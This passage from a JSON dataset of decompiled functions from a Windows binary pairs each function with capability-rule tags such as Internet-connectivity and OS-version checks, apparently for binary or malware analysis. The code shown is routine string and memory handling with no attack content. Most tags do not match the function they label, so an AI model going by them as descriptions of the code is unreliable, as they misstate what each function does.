*(arg1 + 0xc1) = uStack272;\n        *(arg1 + 0xc5) = uStack268;\n        *(arg1 + 0xc9) = uStack264;\n        *(arg1 + 0xcd) = uStack260;\n        *(arg1 + 0xd1) = uStack256;\n        *(arg1 + 0xd5) = uStack252;\n        *(arg1 + 0xd9) = uStack248;\n        *(arg1 + 0xdd) = uStack244;\n        *(arg1 + 0xe1) = uStack240;\n        *(arg1 + 0xe5) = uStack236;\n        *(arg1 + 0xe9) = uStack232;\n        *(arg1 + 0xed) = uStack228;\n        *(arg1 + 0xf1) = uStack224;\n        *(arg1 + 0xf5) = uStack220;\n        *(arg1 + 0xf9) = uStack216;\n        *(arg1 + 0xfd) = uStack212;\n        *(arg1 + 0x101) = uStack208;\n        *(arg1 + 0x105) = uStack204;\n        *(arg1 + 0x109) = uStack200;\n        *(arg1 + 0x10d) = uStack196;\n        *(arg1 + 0x111) = uStack192;\n        *(arg1 + 0x115) = uStack188;\n        *(arg1 + 0x119) = uStack184;\n        *(arg1 + 0x11d) = uStack180;\n        *(arg1 + 0x121) = uStack176;\n        *(arg1 + 0x125) = uStack172;\n        *(arg1 + 0x129) = uStack168;\n        *(arg1 + 0x12d) = uStack164;\n        *(arg1 + 0x131) = uStack160;\n        *(arg1 + 0x135) = uStack156;\n    }\n    else {\n        (**(*arg1 + 0x38))(arg1, &uStack408, auStack152, arg1 + 0x39);\n    }\n    iVar23 = sub.msvcrt.dll_memcmp(&uStack408, arg1 + 0x39, 0x100);\n    *(arg1 + 7) = '\\x02' - (iVar23 == 0);\n    return;\n}\n",
        "token_count": 4515
    },
    "140025a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140025a80(int64_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    if (*(arg1 + 7) != '\\x01') {\n        if (*(arg1 + 7) == '\\0') {\n            fcn.140025400(arg1);\n        }\n        if (*(*arg1 + 0x38) != 0x140025bc0) {\n    // WARNING: Could not recover jumptable at 0x000140025af4. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(*arg1 + 0x38))(arg1, arg2, arg3, arg4);\n            return;\n        }\n    }\n    if (arg2 != arg3) {\n    // WARNING: Could not recover jumptable at 0x000140018630. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_memcpy)(arg4, arg2, arg3 - arg2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "14002621": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140026210(int64_t **arg1, int64_t *arg2)\n\n{\n    int64_t **ppiVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t **ppiVar5;\n    int64_t *piVar6;\n    ulong uVar7;\n    ulong uVar8;\n    int64_t *piVar9;\n    code *pcVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    \n    *(arg1 + 2) = 0;\n    iVar13 = *arg2;\n    ppiVar1 = arg1 + 2;\n    *arg1 = ppiVar1;\n    piVar9 = *(iVar13 + 0x20);\n    arg1[1] = NULL;\n    iVar13 = *piVar9;\n    if (iVar13 == 0) {\n        fcn.1400a1690(arg1, 0, 0, 1);\n        return arg1;\n    }\n    if (piVar9[1] != 0) {\n        uVar4 = 0;\n        do {\n            uVar12 = uVar4 + 1;\n            iVar3 = sub.msvcrt.dll_strcmp(piVar9[uVar4]);\n            if (iVar3 != 0) {\n                pcVar10 = pe_nt_image_headers64;\n                fcn.1400a3070(arg1, 0x80);\n                puVar2 = **0x140102d40;\n                uVar7 = *puVar2;\n                uVar4 = sub.msvcrt.dll_strlen(uVar7);\n                if (0x3fffffffffffffffU - arg1[1] < uVar4) goto code_r0x000140026526;\n                fcn.1400a31b0(arg1, uVar7, uVar4);\n                piVar9 = arg1[1];\n                piVar6 = *arg1;\n                if (ppiVar1 == piVar6) {\n                    pcVar10 = 0xf;\n                }\n                else {\n                    pcVar10 = arg1[2];\n                }\n                if (pcVar10 < piVar9 + 1) {\n                    pcVar10 = piVar9;\n                    fcn.1400a3380(arg1, piVar9, 0, 0);\n                    piVar6 = *arg1;\n                }\n                *(piVar6 + piVar9) = 0x3d;\n                arg1[1] = piVar9 + 1;\n                *(*arg1 + 1 + piVar9) = 0;\n                uVar7 = **(*arg2 + 0x20);\n                uVar4 = sub.msvcrt.dll_strlen(uVar7);\n                if (0x3fffffffffffffffU - arg1[1] < uVar4) goto code_r0x00014002651a;\n                fcn.1400a31b0(arg1, uVar7, uVar4);\n                iVar13 = 8;\n                goto code_r0x000140026428;\n            }\n            uVar4 = uVar12;\n        } while (uVar12 < 5);\n    }\n    sub.msvcrt.dll_strlen(iVar13);\n    fcn.1400a0b80(arg1, 0, 0, iVar13);\n    return arg1;\ncode_r0x000140026428:\n    piVar9 = arg1[1];\n    ppiVar5 = *arg1;\n    if (ppiVar1 == ppiVar5) {\n        pcVar10 = 0xf;\n    }\n    else {\n        pcVar10 = arg1[2];\n    }\n    if (pcVar10 < piVar9 + 1) {\n        pcVar10 = piVar9;\n        fcn.1400a3380(arg1, piVar9, 0, 0);\n        ppiVar5 = *arg1;\n    }\n    *(ppiVar5 + piVar9) = 0x3b;\n    arg1[1] = piVar9 + 1;\n    *(*arg1 + 1 + piVar9) = 0;\n    uVar7 = *(puVar2 + iVar13);\n    uVar4 = sub.msvcrt.dll_strlen(uVar7);\n    if (0x3fffffffffffffffU - arg1[1] < uVar4) {\ncode_r0x00014002650e:\n        fcn.1400b7170(0x1400fd50e);\ncode_r0x00014002651a:\n        fcn.1400b7170(0x1400fd50e);\ncode_r0x000140026526:\n        ppiVar5 = fcn.1400b7170(0x1400fd50e);\n        if (ppiVar1 != *arg1) {\n            fcn.1400b64d0();\n        }\n        fcn.14000f000(ppiVar5);\n        piVar6 = fcn.140075910(0, 0);\n        iVar13 = *pcVar10;\n        *ppiVar5 = piVar6;\n        piVar9 = *(iVar13 + 0x20);\n        iVar13 = *piVar9;\n        if (iVar13 == 0) {\n            fcn.140075d80(ppiVar5, 0, piVar6[-3], 1);\n            return ppiVar5;\n        }\n        if (piVar9[1] == 0) {\ncode_r0x0001400265c0:\n            uVar7 = sub.msvcrt.dll_strlen(iVar13);\n            fcn.140076900(ppiVar5, iVar13, uVar7);\n            return ppiVar5;\n        }\n        uVar4 = 0;\n        while( true ) {\n            uVar12 = uVar4 + 1;\n            iVar3 = sub.msvcrt.dll_strcmp(piVar9[uVar4], piVar9[uVar12]);\n            if (iVar3 != 0) break;\n            uVar4 = uVar12;\n            if (4 < uVar12) goto code_r0x0001400265c0;\n        }\n        fcn.140077810(ppiVar5, 0x80);\n        puVar2 = **0x140102d40;\n        uVar7 = *puVar2;\n        uVar8 = sub.msvcrt.dll_strlen(uVar7);\n        fcn.140076500(ppiVar5, uVar7, uVar8);\n        piVar9 = *ppiVar5;\n        iVar13 = piVar9[-3];\n        uVar4 = iVar13 + 1;\n        if (piVar9[-2] < uVar4) {\ncode_r0x000140026654:\n            fcn.140077810(ppiVar5, uVar4);\n        }\n        else {\n            if (**0x140102a70 == 0) {\n                iVar3 = *(piVar9 + -1);\n            }\n            else {\n                iVar3 = *(piVar9 + -1);\n            }\n            if (0 < iVar3) goto code_r0x000140026654;\n        }\n        *(*ppiVar5 + (*ppiVar5)[-3]) = 0x3d;\n        piVar9 = *ppiVar5;\n        piVar9[-3] = uVar4;\n        *(piVar9 + -1) = 0;\n        *(piVar9 + iVar13 + 1) = 0;\n        uVar7 = **(*pcVar10 + 0x20);\n        uVar8 = sub.msvcrt.dll_strlen(uVar7);\n        fcn.140076500(ppiVar5, uVar7, uVar8);\n        iVar13 = 8;\n        do {\n            piVar9 = *ppiVar5;\n            iVar11 = piVar9[-3];\n            uVar4 = iVar11 + 1;\n            if (piVar9[-2] < uVar4) {\ncode_r0x0001400266b7:\n                fcn.140077810(ppiVar5, uVar4);\ncode_r0x0001400266c2:\n                piVar9 = *ppiVar5;\n                iVar11 = piVar9[-3];\n            }\n            else {\n                if (**0x140102a70 != 0) {\n                    if (0 < *(piVar9 + -1)) goto code_r0x0001400266b7;\n                    goto code_r0x0001400266c2;\n                }\n                if (0 < *(piVar9 + -1)) goto code_r0x0001400266b7;\n            }\n            *(piVar9 + iVar11) = 0x3b;\n            piVar9 = *ppiVar5;\n            piVar9[-3] = uVar4;\n            *(piVar9 + -1) = 0;\n            *(piVar9 + uVar4) = 0;\n            uVar7 = *(puVar2 + iVar13);\n            uVar8 = sub.msvcrt.dll_strlen(uVar7);\n            fcn.140076500(ppiVar5, uVar7, uVar8);\n            piVar9 = *ppiVar5;\n            iVar11 = piVar9[-3];\n            uVar4 = iVar11 + 1;\n            if (piVar9[-2] < uVar4) {\ncode_r0x000140026729:\n                fcn.140077810(ppiVar5, uVar4);\n            }\n            else {\n                if (**0x140102a70 == 0) {\n                    iVar3 = *(piVar9 + -1);\n                }\n                else {\n                    iVar3 = *(piVar9 + -1);\n                }\n                if (0 < iVar3) goto code_r0x000140026729;\n            }\n            *(*ppiVar5 + (*ppiVar5)[-3]) = 0x3d;\n            piVar9 = *ppiVar5;\n            piVar9[-3] = uVar4;\n            *(piVar9 + -1) = 0;\n            *(piVar9 + iVar11 + 1) = 0;\n            uVar7 = *(*(*pcVar10 + 0x20) + iVar13);\n            uVar8 = sub.msvcrt.dll_strlen(uVar7);\n            fcn.140076500(ppiVar5, uVar7, uVar8);\n            iVar13 = iVar13 + 8;\n            if (iVar13 == 0x30) {\n                return ppiVar5;\n            }\n        } while( true );\n    }\n    fcn.1400a31b0(arg1, uVar7, uVar4);\n    piVar9 = arg1[1];\n    ppiVar5 = *arg1;\n    if (ppiVar1 == ppiVar5) {\n        pcVar10 = 0xf;\n    }\n    else {\n        pcVar10 = arg1[2];\n    }\n    if (pcVar10 < piVar9 + 1) {\n        pcVar10 = piVar9;\n        fcn.1400a3380(arg1, piVar9, 0, 0);\n        ppiVar5 = *arg1;\n    }\n    *(ppiVar5 + piVar9) = 0x3d;\n    arg1[1] = piVar9 + 1;\n    *(*arg1 + 1 + piVar9) = 0;\n    uVar7 = *(*(*arg2 + 0x20) + iVar13);\n    uVar4 = sub.msvcrt.dll_strlen(uVar7);\n    if (0x3fffffffffffffffU - arg1[1] < uVar4) {\n        fcn.1400b7170(0x1400fd50e);\n        goto code_r0x00014002650e;\n    }\n    fcn.1400a31b0(arg1, uVar7, uVar4);\n    iVar13 = iVar13 + 8;\n    if (iVar13 == 0x30) {\n        return arg1;\n    }\n    goto code_r0x000140026428;\n}\n",
        "token_count": 2634
    },
    "140027e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140027e20(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    if (**0x140102a70 == 0) {\n        iVar2 = *(arg1 + 1);\n        *(arg1 + 1) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = arg1 + 1;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 != 1) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x000140027e43. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 8))();\n    return;\n}\n",
        "token_count": 182
    },
    "14002999": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140029990(int64_t *arg1, uchar *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uint64_t arg4_00;\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    \n    arg4_00 = arg1[1];\n    if (arg4_00 < arg4) {\n        puVar1 = 0x1400fe8d8;\n        fcn.1400b1a60(0x1400fe8d8, 0x1400fe9f3, arg4, arg4_00);\n        return *puVar1;\n    }\n    uVar2 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar2 = arg3;\n    }\n    if (uVar2 != 0) {\n        if (uVar2 == 1) {\n            *arg2 = *(arg4 + *arg1);\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, arg4 + *arg1, uVar2);\n    }\n    return uVar2;\n}\n",
        "token_count": 257
    },
    "14002a72": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14002a720(int64_t *arg1, ushort *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    ushort *puVar1;\n    uint64_t arg4_00;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    \n    arg4_00 = arg1[1];\n    if (arg4_00 < arg4) {\n        puVar2 = 0x1400fecf8;\n        fcn.1400b1a60(0x1400fecf8, \"basic_string::copy\", arg4, arg4_00);\n        return *puVar2;\n    }\n    uVar3 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar3 = arg3;\n    }\n    if (uVar3 != 0) {\n        puVar1 = *arg1 + arg4 * 2;\n        if (uVar3 == 1) {\n            *arg2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, puVar1, uVar3 * 2);\n    }\n    return uVar3;\n}\n",
        "token_count": 271
    },
    "14002d37": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.14002d370(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, uint *noname_4, int64_t noname_5, \n             uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uint64_t *puVar4;\n    char cVar5;\n    uint8_t uVar6;\n    char cVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t *puVar12;\n    int64_t *piVar13;\n    int32_t iVar14;\n    uint8_t uVar15;\n    bool bVar16;\n    uint uVar17;\n    bool bVar18;\n    uint64_t uVar19;\n    int64_t *piVar20;\n    int64_t iVar21;\n    uint8_t uVar22;\n    uint64_t uVar23;\n    bool bVar24;\n    bool bVar25;\n    ulong var_8h_2;\n    uint32_t *var_50h;\n    ulong auStack208 [5];\n    uint64_t auStack168 [2];\n    int64_t *piStack152;\n    uint64_t uStack144;\n    uint64_t *puStack136;\n    int64_t *piStack128;\n    int64_t *piStack120;\n    int64_t *piStack112;\n    uint8_t uStack101;\n    uint32_t uStack100;\n    uint64_t *var_58h;\n    uint64_t *var_50h_2;\n    int64_t *var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_1dh;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piStack152 = arg3[1];\n    piVar13 = *arg4;\n    var_50h_2 = *arg3;\n    piVar1 = arg4[1];\n    noname_7 = noname_7 + 0xd0;\n    iVar14 = piStack152;\n    var_48h = var_48h & 0xffffffff00000000 | piStack152 & 0xffffffff;\n    auStack208[0] = 0x14002d3c6;\n    piStack128 = piVar13;\n    piVar8 = fcn.1400b36a0(noname_7);\n    auStack208[0] = 0x14002d3d5;\n    iVar9 = fcn.14000e880(noname_7);\n    piVar20 = var_50h_2;\n    uVar10 = var_48h & 0xffffffff;\n    iVar9 = -iVar9;\n    bVar24 = iVar14 == -1;\n    bVar16 = var_50h_2 != NULL && bVar24;\n    bVar18 = bVar24;\n    if (bVar16) {\n        if (var_50h_2[2] < var_50h_2[3]) {\n            bVar18 = false;\n        }\n        else {\n            iVar21 = *var_50h_2;\n            var_50h_2 = var_50h_2 & 0xffffffff00000000 | var_48h & 0xffffffff;\n            var_48h = piVar20;\n            pcVar2 = *(iVar21 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002dd4b;\n            iVar14 = (*pcVar2)(piVar20);\n            uVar10 = var_50h_2 & 0xffffffff;\n            piVar20 = var_48h;\n            if (iVar14 == -1) {\n                piVar20 = NULL;\n            }\n            bVar18 = iVar14 == -1 && bVar16;\n        }\n    }\n    bVar25 = piVar1 == -1;\n    uStack101 = bVar25;\n    bVar16 = piVar13 != NULL && bVar25;\n    if (bVar16) {\n        if (piVar13[2] < piVar13[3]) {\n            bVar25 = false;\n        }\n        else {\n            var_50h_2 = piVar20;\n            var_48h = var_48h & 0xffffffff00000000 | uVar10;\n            pcVar2 = *(*piVar13 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002dd15;\n            iVar14 = (*pcVar2)(piVar13);\n            uVar10 = var_48h & 0xffffffff;\n            piStack128 = NULL;\n            if (iVar14 != -1) {\n                piStack128 = piVar13;\n            }\n            bVar25 = iVar14 == -1 && bVar16;\n            piVar20 = var_50h_2;\n        }\n    }\n    var_48h._0_4_ = uVar10;\n    if (bVar25 != bVar18) {\n        if ((piVar20 == NULL) || (!bVar24)) {\n            cVar7 = uVar10;\n        }\n        else if (piVar20[2] < piVar20[3]) {\n            cVar7 = *piVar20[2];\n        }\n        else {\n            var_50h_2 = var_50h_2 & 0xffffffff00000000 | uVar10;\n            var_48h = piVar20;\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002de4b;\n            iVar14 = (*pcVar2)(piVar20);\n            var_48h._0_4_ = var_50h_2;\n            cVar7 = iVar14;\n            piVar20 = var_48h;\n            if (iVar14 == -1) {\n                cVar7 = -1;\n                piVar20 = NULL;\n            }\n        }\n        var_50h_2 = piVar20;\n        var_48h = var_48h & 0xffffffff00000000 | var_48h;\n        pcVar2 = *(*piVar8 + 0x20);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d488;\n        cVar5 = (*pcVar2)(piVar8, cVar7);\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d495;\n        uVar6 = (*pcVar2)(piVar8, cVar7);\n        piVar20 = var_50h_2;\n        if (noname_6 != 0) {\n            var_48h = var_48h & 0xffffffffffffff00 | uVar6;\n            var_58h = &stack0xffffffffffffff58 + iVar9 + noname_6 * 8;\n            uStack100 = var_48h;\n            piStack112 = var_50h_2;\n            var_50h_2 = &stack0xffffffffffffff58 + iVar9;\n            uVar10 = 0;\n            uVar19 = 0;\n            do {\n                while( true ) {\n                    uVar11 = uVar10;\n                    cVar7 = **(noname_5 + uVar11 * 8);\n                    pcVar2 = *(*piVar8 + 0x20);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x14002d4fe;\n                    cVar7 = (*pcVar2)(piVar8, cVar7);\n                    if (cVar5 != cVar7) break;\ncode_r0x00014002d503:\n                    uVar3 = *(noname_5 + uVar11 * 8);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x14002d514;\n                    uVar10 = sub.msvcrt.dll_strlen(uVar3);\n                    var_58h[uVar19] = uVar10;\n                    uVar23 = uVar19 + 1;\n                    var_50h_2[uVar19] = uVar11;\n                    uVar10 = uVar11 + 1;\n                    uVar19 = uVar23;\n                    if (noname_6 == uVar11 + 1) goto code_r0x00014002d531;\n                }\n                pcVar2 = *(*piVar8 + 0x10);\n                *(&stack0xffffffffffffff30 + iVar9) = 0x14002d4e0;\n                cVar7 = (*pcVar2)(piVar8);\n                if (var_48h == cVar7) goto code_r0x00014002d503;\n                uVar10 = uVar11 + 1;\n            } while (noname_6 != uVar11 + 1);\ncode_r0x00014002d531:\n            puVar4 = var_50h_2;\n            piVar20 = piStack112;\n            if (uVar19 < 2) {\n                uVar10 = 0;\n                var_48h._0_4_ = uStack100;\n            }\n            else {\n                uStack144 = uVar11 + 1;\n                var_48h = NULL;\n                uVar10 = *var_58h;\n                piStack112 = uVar19 * 8;\n                puStack136 = var_58h + 1;\ncode_r0x00014002d580:\n                puVar12 = puStack136;\n                uVar11 = uVar10;\n                do {\n                    if (*puVar12 < uVar11) {\n                        uVar11 = *puVar12;\n                    }\n                    puVar12 = puVar12 + 1;\n                } while (var_58h + piStack112 != puVar12);\n                var_48h = var_48h + 1;\n                if (piVar20[2] < piVar20[3]) {\n                    piVar20[2] = piVar20[2] + 1;\n                }\n                else {\n                    pcVar2 = *(*piVar20 + 0x50);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x14002d709;\n                    (*pcVar2)(piVar20);\n                }\n                if (var_48h == uVar11) {\n                    if (piVar20[2] < piVar20[3]) {\ncode_r0x00014002d721:\n                        uStack100._0_1_ = 0;\n                    }\n                    else {\n                        pcVar2 = *(*piVar20 + 0x48);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14002dd70;\n                        iVar14 = (*pcVar2)(piVar20);\n                        if (iVar14 != -1) goto code_r0x00014002d721;\n                        uStack100._0_1_ = 1;\n                        piVar20 = NULL;\n                    }\n                    piVar13 = piStack128;\n                    uVar6 = piStack128 != NULL & uStack101;\n                    var_50h_2._0_1_ = uStack101;\n                    if (uVar6 != 0) {\n                        if (piStack128[2] < piStack128[3]) {\n                            var_50h_2._0_1_ = 0;\n                        }\n                        else {\n                            uStack100 = uStack100 & 0xffffff00 | uStack100;\n                            var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n                            pcVar2 = *(*piStack128 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002dcde;\n                            iVar14 = (*pcVar2)(piVar13);\n                            piStack128 = NULL;\n                            if (iVar14 != -1) {\n                                piStack128 = piVar13;\n                            }\n                            if (iVar14 != -1) {\n                                var_50h_2._0_1_ = 0;\n                            }\n                        }\n                    }\n                    bVar16 = false;\n                    if (var_50h_2 == uStack100) goto code_r0x00014002d7fe;\n                    if (piVar20 == NULL) {\ncode_r0x00014002db30:\n                        piVar20 = NULL;\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14002db40;\n                        uVar6 = (*pcVar2)(piVar8, 0xffffffff);\n                        uStack100 = uStack100 & 0xffffff00 | uVar6;\n                    }\n                    else {\n                        if (piVar20[3] <= piVar20[2]) {\n                            pcVar2 = *(*piVar20 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002db27;\n                            iVar14 = (*pcVar2)(piVar20);\n                            if (iVar14 == -1) goto code_r0x00014002db30;\n                        }\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d76b;\n                        uVar6 = (*pcVar2)(piVar8);\n                        uStack100 = uStack100 & 0xffffff00 | uVar6;\n                        if (piVar20[3] <= piVar20[2]) {\n                            pcVar2 = *(*piVar20 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002dcb1;\n                            iVar14 = (*pcVar2)(piVar20);\n                            if (iVar14 == -1) {\n                                piVar20 = NULL;\n                            }\n                        }\n                    }\n                    uVar23 = 0;\n                    pcVar2 = *(*piVar8 + 0x10);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x14002d78a;\n                    uVar6 = (*pcVar2)(piVar8);\n                    uVar11 = var_48h;\n                    piStack120 = piVar20;\n                    var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n                    auStack168[1] = uVar10;\n                    do {\n                        if (uVar11 < var_58h[uVar23]) {\n                            pcVar2 = *(*piVar8 + 0x20);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002d7ca;\n                            cVar7 = (*pcVar2)(piVar8);\n                            if (cVar7 != uStack100) {\n                                pcVar2 = *(*piVar8 + 0x10);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x14002d7df;\n                                cVar7 = (*pcVar2)(piVar8);\n                                if (var_50h_2 != cVar7) goto code_r0x00014002d7e8;\n                            }\n                            bVar16 = true;\n                            piVar20 = piStack120;\n                            uVar10 = auStack168[1];\n                            goto code_r0x00014002d7fe;\n                        }\ncode_r0x00014002d7e8:\n                        uVar23 = uVar23 + 1;\n                    } while (uVar23 != uVar19);\n                    bVar16 = false;\n                    piVar20 = piStack120;\n                    uVar10 = auStack168[1];\ncode_r0x00014002d7fe:\n                    uVar11 = 0;\n                    do {\n                        if ((var_48h == uVar10) == bVar16) {\n                            uVar19 = uVar19 - 1;\n                            piStack112 = uVar19 * 8;\n                            puVar4[uVar11] = puVar4[uVar19];\n                            var_58h[uVar11] = var_58h[uVar19];\n                            if (uVar19 <= uVar11) goto code_r0x00014002d848;\n                        }\n                        else {\n                            uVar11 = uVar11 + 1;\n                            if (uVar19 <= uVar11) goto code_r0x00014002d848;\n                        }\n                        uVar10 = var_58h[uVar11];\n                    } while( true );\n                }\n                if (var_48h < uVar11) goto code_r0x00014002d5d9;\ncode_r0x00014002d8c6:\n                var_48h._0_4_ = 0xffffffff;\n                uVar10 = var_48h;\n            }\n            if (uVar19 == 1) {\n                if (piVar20[2] < piVar20[3]) {\n                    piVar20[2] = piVar20[2] + 1;\n                    var_48h = piVar20;\n                }\n                else {\n                    var_48h = piVar20;\n                    pcVar2 = *(*piVar20 + 0x50);\n                    *(&stack0xffffffffffffff30 + iVar9) = 0x14002dbf9;\n                    (*pcVar2)(piVar20);\n                }\n                uVar19 = *puVar4;\n                uVar10 = uVar10 + 1;\n                iVar21 = *(noname_5 + uVar19 * 8);\n                uVar11 = *var_58h;\n                piVar20 = var_48h;\n                if (uVar10 < uVar11) {\ncode_r0x00014002d9a0:\n                    do {\n                        if (piVar20[2] < piVar20[3]) {\ncode_r0x00014002d9ae:\n                            uVar6 = 0;\n                        }\n                        else {\n                            var_48h = piVar20;\n                            pcVar2 = *(*piVar20 + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002dc0f;\n                            iVar14 = (*pcVar2)(piVar20);\n                            piVar20 = var_48h;\n                            if (iVar14 != -1) goto code_r0x00014002d9ae;\n                            uVar6 = 1;\n                            piVar20 = NULL;\n                        }\ncode_r0x00014002d9b1:\n                        piVar13 = piStack128;\n                        uVar17 = uVar19;\n                        uVar15 = piStack128 != NULL & uStack101;\n                        uVar22 = uStack101;\n                        if (uVar15 != 0) {\n                            if (piStack128[2] < piStack128[3]) {\n                                uVar22 = 0;\n                            }\n                            else {\n                                var_48h = piVar20;\n                                pcVar2 = *(*piStack128 + 0x48);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x14002dc62;\n                                iVar14 = (*pcVar2)(piVar13);\n                                piVar13 = NULL;\n                                if (iVar14 != -1) {\n                                    piVar13 = piStack128;\n                                }\n                                piStack128 = piVar13;\n                                piVar20 = var_48h;\n                                uVar22 = uVar15;\n                                if (iVar14 != -1) {\n                                    uVar22 = 0;\n                                }\n                            }\n                        }\n                        if (uVar6 == uVar22) goto code_r0x00014002d919;\n                        cVar7 = *(iVar21 + uVar10);\n                        var_48h = piVar20;\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d9e1;\n                        cVar7 = (*pcVar2)(piVar8, cVar7);\n                        piVar13 = var_48h;\n                        if (var_48h == NULL) {\ncode_r0x00014002d9f0:\n                            pcVar2 = *(*piVar8 + 0x20);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002d9fe;\n                            cVar5 = (*pcVar2)(piVar8);\n                            if (cVar7 != cVar5) {\n                                cVar7 = *(iVar21 + uVar10);\n                                pcVar2 = *(*piVar8 + 0x10);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x14002d95e;\n                                cVar7 = (*pcVar2)(piVar8, cVar7);\n                                var_48h = NULL;\n                                goto code_r0x00014002d968;\n                            }\n                            uVar23 = *0x10;\n                            piVar20 = NULL;\n                            piVar13 = NULL;\n                            if (*0x10 < *0x18) goto code_r0x00014002d98b;\ncode_r0x00014002da17:\n                            var_48h = piVar13;\n                            pcVar2 = *(*piVar13 + 0x50);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002da28;\n                            (*pcVar2)(piVar13);\n                            uVar10 = uVar10 + 1;\n                            piVar20 = var_48h;\n                            if (uVar10 + 1 == uVar11) break;\n                            goto code_r0x00014002d9a0;\n                        }\n                        if (var_48h[3] <= var_48h[2]) {\n                            pcVar2 = *(*var_48h + 0x48);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002dc3d;\n                            iVar14 = (*pcVar2)(piVar13);\n                            if (iVar14 == -1) goto code_r0x00014002d9f0;\n                        }\n                        pcVar2 = *(*piVar8 + 0x20);\n                        *(&stack0xffffffffffffff30 + iVar9) = 0x14002dacf;\n                        cVar5 